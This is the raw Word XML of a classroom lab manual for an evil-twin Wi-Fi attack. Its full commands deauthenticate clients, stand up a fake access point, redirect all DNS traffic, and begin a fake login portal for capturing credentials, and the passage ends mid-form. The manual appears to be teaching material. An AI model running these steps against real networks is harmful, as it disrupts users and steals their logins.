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421E5"/>
    <w:p w14:paraId="49CC3FF5"/>
    <w:p w14:paraId="43A9CC94">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>📖 Classroom Manual: Evil Twin Wi-Fi Attack (Educational Lab)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7162AFDE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5512BDE0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>⚠️ Important Disclaimer (Tell Students First):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5B9EDA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>This demo must only be performed in a controlled lab. Never try this on real networks. The purpose is to understand attacker techniques so we can design better defenses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E23F135">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21F9CF34">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🛠️ Lab Requirements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B2C67F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Hardware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0FC106">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32A9A24B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Attacker Machine: Kali Linux (with root access)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2273C83E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C9EA6CC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Wi-Fi Adapter: ALFA AWUS1900 (supports monitor mode + AP mode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F74E87">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7150AC1C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Victim Device: A smartphone / laptop with Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6570DF1B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="497675F1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Software (on Kali)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C62FAF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo apt update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1455ED7C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo apt install hostapd dnsmasq apache2 aircrack-ng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041E6DC3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75A26F33">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🔑 Step 1: Identify Your Adapter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC60856">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="306D14A0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Plug in ALFA adapter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60120806">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D060B52">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B88DD9F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="416AEBF1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>iwconfig</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D53097F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38DD7894">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="125DFDBC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Look for the interface name (likely wlan0).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E54B365">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="773D4FB0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>📡 Step 2: Monitor &amp; Jam the Target Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E31C26">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="656DD9C4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Enable monitor mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5047D1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="235F5CE7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo ip link set wlan0 down</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3EFF68">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo iw dev wlan0 set type monitor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D90838">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo ip link set wlan0 up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C29C4A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="324291ED">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CFCE6D6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Scan nearby Wi-Fi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CAF9CA2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B74908F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo airodump-ng wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233E73B6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="513DDC4B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2827497C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Note:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7FA6FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D5219D6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>BSSID → AP MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC37E04">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="564D0CFE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>CH (Channel)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461B7682">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5201378D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>ESSID (Wi-Fi name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62846850">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31E6A841">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Jam clients (force disconnect):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24ACF392">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53719AC5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo aireplay-ng --deauth 10 -a &lt;BSSID&gt; wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6246AC52">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E42202C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="002E7CE0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🔎 This sends deauth frames → victim disconnects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363EFAD6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C6102F7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🛰️ Step 3: Create the Evil Twin AP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515BD914">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>3.1 Configure hostapd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3051FA00">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="318E3591">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Create /etc/hostapd/hostapd.conf:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4115F66D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F91E21E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>interface=wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200EA9DF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>driver=nl80211</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC28D32">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>ssid=MyFreeWiFi     # Fake Wi-Fi name (same as victim’s if you want to mimic)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632511F9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>hw_mode=g</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721F21BE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>channel=6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44922585">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F055D2E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57FAEAE4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Start the fake AP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A8DB20">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53B85C87">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo hostapd /etc/hostapd/hostapd.conf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F91061D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10081BD3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🌐 Step 4: Redirect Victim’s Traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B752CE8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>4.1 Configure DHCP + DNS (dnsmasq)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEBF498">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="689B7831">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Edit /etc/dnsmasq.conf:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2C04D8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1108FFCE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>interface=wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2325A908">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>dhcp-range=192.168.10.10,192.168.10.100,12h</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1222785E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>dhcp-option=3,192.168.10.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B032C4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>dhcp-option=6,192.168.10.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B687F8D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>address=/#/192.168.10.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A55745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0ABC2152">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31B78387">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Assign IP to interface:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3AE6BA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="204C9D1A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo ifconfig wlan0 192.168.10.1/24 up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF8CC1B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01451A9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B722F0D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Run dnsmasq:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B72836A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68C7BBFC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo dnsmasq -C /etc/dnsmasq.conf -d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BD63E0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59320D2E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🖥️ Step 5: Fake Login Page Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F33CEA6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>5.1 Start Apache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52093C67">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo systemctl start apache2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CDEC9C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="714D9609">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>5.2 Replace the default page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769EC182">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E70A7CE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Create /var/www/html/index.html:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634C745C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78298DDC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035349AB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>&lt;html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FB7869">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4C308E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;title&gt;Wi-Fi Login Portal&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410B889B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697886A5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">    body { font-family: Arial; text-align: center; margin-top: 100px; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB6F362">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">    .box { border: 1px solid #ccc; padding: 20px; display: inline-block; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52EC3848">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">    input { margin: 10px; padding: 8px; width: 200px; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65056C63">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">    button { padding: 10px 20px; background: blue; color: white; border: none; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C48DFFB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6E1B23D9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A20AF2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AA6F03">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;div class="box"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EF8A74">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;h2&gt;Login to Access Wi-Fi&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0803C020">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;form method="POST" action="login.php"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7688F362">
      <w:pPr>
